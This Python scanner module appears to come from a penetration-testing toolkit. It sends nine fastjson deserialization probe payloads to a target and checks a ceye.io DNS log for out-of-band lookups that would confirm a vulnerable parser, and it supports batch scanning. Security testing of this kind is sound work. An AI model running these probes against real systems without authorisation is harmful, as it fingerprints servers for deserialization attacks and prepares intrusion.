import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
import string
import random

class FastJsonCheckScan:
    def fastjsonScanner(self,url_0, keyword,dns,api):
        dnslog = keyword + '.' + dns

        # fastjson 1.2.67 版本之前
        payload_1 = '{"zeo":{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}}'
        # fastjson 1.2.67 版本之后
        payload_2 = '{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}'
        payload_3 = '{"@type":"java.net.Inet6Address","val":"' + dnslog + '"}'
        # 畸形payload
        payload_4 = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"' + dnslog + '"}}'
        payload_5 = '{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"' + dnslog + '"}}""}'
        payload_6 = '{{"@type":"java.net.URL","val":"' + dnslog + '"}:"aaa"}'
        payload_7 = 'Set[{"@type":"java.net.URL","val":"' + dnslog + '"}]'
        payload_8 = 'Set[{"@type":"java.net.URL","val":"' + dnslog + '"}'
        payload_9 = '{{"@type":"java.net.URL","val":"' + dnslog + '"}:0'

        payload_list = [payload_1, payload_2, payload_3, payload_4, payload_5, payload_6, payload_7, payload_8,
                        payload_9]

        for payload in payload_list:
            if not self.batch:
                OutPrintInfo('FastJson', f'测试: {payload}')
            try:
                req = requests.post(url=url_0, headers=self.headers,proxies=self.proxy, data=payload, timeout=1)
            except:
                if not self.batch:
                    OutPrintInfo('FastJson', f'{url_0}访问失败...')

                continue

            # dnslog会有延迟，这里稍作停顿
            # time.sleep(3)

            try:  # 需要替换自己的token
                check = requests.get(url=f"http://api.ceye.io/v1/records?token={api}&type=dns&filter=" + keyword,
                                     headers=self.headers)
                if check.text.find(keyword) >= 1:
                    OutPrintInfoSuc('FastJson', f'{url_0}存在fastjson,payload: {payload}')
                    if self.batch:
                        OutPutFile("fastjson_check.txt",f'{url_0}存在fastjson,payload: {payload}')

                    # 只探测一个成功的payload
                    break

            except:
                if not self.batch:
                    OutPrintInfo('FastJson', '查询失败')



    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        dns = target["ceyedns"]
        api = target["ceyeapi"]

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo('FastJson', '开始检测是否使用Fastjson...')
        n = 1
        keys = random.sample(string.ascii_letters, 4)
        key = ''.join(keys)
        # for url in open('urls.txt'):
            # 每次运行生成随机key，省去清空dnslog操作
        keyword = str(n) + key
        # print(keyword)
        self.fastjsonScanner(url, keyword,dns,api)

        if not self.batch:
            OutPrintInfo('FastJson', 'Fastjson检测结束')